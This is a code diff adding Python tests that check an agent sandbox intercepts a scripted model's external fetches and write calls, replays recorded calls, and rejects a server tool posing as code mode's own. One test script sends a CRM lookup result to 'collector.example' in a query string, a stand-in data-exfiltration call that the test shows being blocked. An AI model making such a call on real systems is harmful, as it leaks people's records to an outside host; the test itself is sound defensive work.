@@ -916,3 +916,103 @@ class TestRemoteDelegates:
 
         send.assert_not_awaited()
         assert "not sent" in output
+
+
+def _scripting(code: str) -> FunctionModel:
+    """A code-mode model: one `run_code` with `code`, then an answer quoting what it got."""
+
+    def respond(messages: list[ModelMessage], _info: AgentInfo) -> ModelResponse:
+        if len(messages) == 1:
+            return ModelResponse(
+                parts=[ToolCallPart(tool_name="run_code", args={"code": code}, tool_call_id="s")]
+            )
+        returned = [
+            str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
+        ]
+        return ModelResponse(parts=[TextPart(" | ".join(returned))])
+
+    return FunctionModel(respond)
+
+
+class TestCodeMode:
+    """A code-mode agent is evaluated with its tools, each call held on its own merits."""
+
+    async def test_a_scripts_calls_are_decided_one_by_one(self, monkeypatch):
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        download = AsyncMock()
+        monkeypatch.setattr(_ReadableFetch, "__call__", download)
+        world = _World()
+        isolation = RunIsolation()
+        built = _isolated(
+            AgentSpec(
+                name="Scripter",
+                capabilities=[{"id": "web_fetch"}],
+                code_mode={"enabled": True},
+            ),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        code = (
+            "found = await crm_find(name='Ada')\n"
+            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
+            "made = await crm_create(name='Ada')\n"
+            "[found, page, made]"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            result = await built.agent.run("go", deps=built.deps)
+
+        download.assert_not_awaited()
+        assert world.effects == [("crm_find", "Ada")]
+        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
+            ("web_fetch", InterceptionReason.EXTERNAL),
+            ("crm_create", InterceptionReason.WRITES),
+        ]
+        assert "crm_find did Ada" in result.output
+
+    async def test_a_script_runs_from_a_recording_and_each_call_is_answered_from_it(self):
+        world = _World()
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [RecordedCall("tool:crm_find", normalized_args({"name": "Ada"}), "Ada, recorded")]
+            )
+        )
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+
+        with built.agent.override(
+            model=_scripting("[await crm_find(name='Ada'), await crm_create(name='Ada')]")
+        ):
+            result = await built.agent.run("go", deps=built.deps)
+
+        assert world.effects == []
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("crm_find", InterceptionOutcome.REPLAYED),
+            ("crm_create", InterceptionOutcome.DIVERGENT),
+        ]
+        assert "Ada, recorded" in result.output
+
+    def test_only_code_modes_own_tool_is_a_script(self):
+        """A server can call its tool `run_code`; it cannot stamp it as code mode's."""
+        from app.agents.code_mode import CODE_MODE_ID
+
+        ours = ToolDefinition(name="run_code", capability_id=CODE_MODE_ID)
+        theirs = ToolDefinition(
+            name="run_code", metadata={MCP_ISOLATION: {"test": False}}, capability_id=CODE_MODE_ID
+        )
+        named_alike = ToolDefinition(name="run_code")
+
+        assert classify(ours, {}).script is True
+        assert classify(theirs, {}).script is False
+        assert classify(named_alike, {}).script is False
+        assert classify(named_alike, {}).read_only is False
